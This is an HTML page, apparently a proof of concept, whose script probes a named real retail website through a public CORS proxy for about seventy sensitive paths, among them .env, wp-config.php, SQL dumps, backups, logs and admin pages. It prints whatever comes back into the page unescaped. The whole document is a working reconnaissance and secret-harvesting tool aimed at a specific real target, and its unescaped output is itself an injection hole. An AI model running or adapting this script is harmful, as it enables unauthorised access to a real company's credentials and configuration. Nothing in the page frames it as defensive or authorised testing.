<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cross-Domain Access PoC</title>
    <style>
        #output {
            border: 1px solid #ccc;
            margin-top: 10px;
            height: 600px;
            overflow-y: auto;
            padding: 10px;
        }
    </style>
</head>
<body>
    <h1>Cross-Domain Access PoC</h1>
    <button onclick="makeRequests()">Request Common Internal Files</button>
    <div id="output"></div>
    <div id="completionMessage" style="margin-top: 20px;"></div>

    <script>
        const files = [
            'config.php', 'wp-config.php', 'database.sql', 'config.inc.php', 
            'old_version.php', 'test_script.php', 'admin/', 'uploads/', 
            'favicon.ico', 'robots.txt', 'sitemap.xml', 'error.log', 
            'access.log', 'backup.sql', 'version.txt', 'sample.json', 
            '.env', '.htaccess', 'index.html.bak', 'settings.php', 
            'logs/debug.log', 'logs/error.log', 'readme.txt', 'changelog.txt', 
            'api/status', 'api/products', 'api/users', 'api/cart', 'api/orders', 
            'admin/config.php', 'admin/settings.php', 'admin/users.php', 
            'admin/dashboard.php', 'admin/manage.php', 'admin/login.php', 
            'old/index.html', 'old/index.php', 'uploads/test.txt', 
            'uploads/sample.jpg', 'uploads/example.png', 
            'files/uploads/test.doc', 'files/backups/backup.zip', 
            'backup/backup.sql', 'config/config.yaml', 'config/config.json', 
            'system/logs/access.log', 'system/logs/error.log', 
            'cache/tmp.cache', 'cache/session.cache', 
            'tmp/tempfile.txt', 'temp/tempfile.tmp', 
            'scripts/old_script.js', 'scripts/test.js', 'scripts/example.js', 
            'test.php', 'test.html', 'status.html', 'info.php', 
            'info.json', 'data.json', 'uploads/logs/log.txt', 
            'uploads/backups/config.bak', 'backup.tar.gz', 'dump.sql',
            'system/version.txt', 'system/README.md', 'version_history.txt', 
            'project-info.txt', 'assets/docs/manual.pdf', 
            'assets/img/logo.png', 'assets/css/style.css',
            // Add more files as needed
        ];

        async function makeRequests() {
            const baseUrl = 'https://www.oneplus.in/';
            const outputDiv = document.getElementById("output");
            const completionMessage = document.getElementById("completionMessage");
            outputDiv.innerHTML = ''; // Clear previous output
            completionMessage.innerHTML = ''; // Clear previous message

            for (let file of files) {
                try {
                    const response = await fetch(`https://cors-anywhere.herokuapp.com/${baseUrl}${file}`);
                    if (response.ok) {
                        const data = await response.text();
                        outputDiv.innerHTML += `<h3>Response from ${file}:</h3><div>${data}</div><hr/>`;
                    }
                } catch (error) {
                    // Handle errors silently
                }
                await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1 second between requests
            }

            completionMessage.innerHTML = "<strong>All requests completed!</strong>";
        }
    </script>
</body>
</html>
